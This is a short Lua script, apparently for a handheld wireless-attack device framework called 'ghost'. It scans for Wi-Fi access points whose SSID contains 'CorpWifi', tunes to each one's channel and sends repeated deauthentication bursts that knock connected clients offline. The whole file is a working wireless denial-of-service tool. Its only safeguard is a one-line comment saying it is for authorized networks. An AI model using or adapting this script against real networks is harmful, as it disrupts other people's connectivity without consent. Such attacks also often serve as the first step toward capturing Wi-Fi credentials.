-- Scan for APs and deauth those whose SSID contains TARGET_PATTERN.
-- Requires wifi and wifi_control permissions. Use only on networks you own or are authorized to test.

local TARGET_PATTERN = "CorpWifi"
local DEAUTH_BURSTS = 5

ghost.ui.set_title("SSID deauth")
print("scanning for SSIDs containing " .. TARGET_PATTERN)

if not ghost.wifi.scan_start() then
    print("scan_start failed")
    return
end

while not ghost.wifi.scan_done() do
    ghost.delay(500)
end

local count = ghost.wifi.scan_finish()
local target = TARGET_PATTERN:lower()
local matches = 0

for i = 0, count - 1 do
    local ssid = ghost.results.field("wifi.ap", i, "ssid") or ""
    if ssid:lower():find(target, 1, true) then
        local bssid = ghost.results.field("wifi.ap", i, "bssid") or ""
        local channel = ghost.results.field("wifi.ap", i, "channel") or 1
        matches = matches + 1
        print("deauth " .. bssid .. " ssid=" .. ssid .. " ch=" .. channel)
        ghost.wifi.set_channel(channel)
        for _ = 1, DEAUTH_BURSTS do
            ghost.wifi.deauth(bssid, 1)
            ghost.delay(50)
        end
    end
end

print("matches: " .. matches)
ghost.ui.set_title("Done: " .. matches)
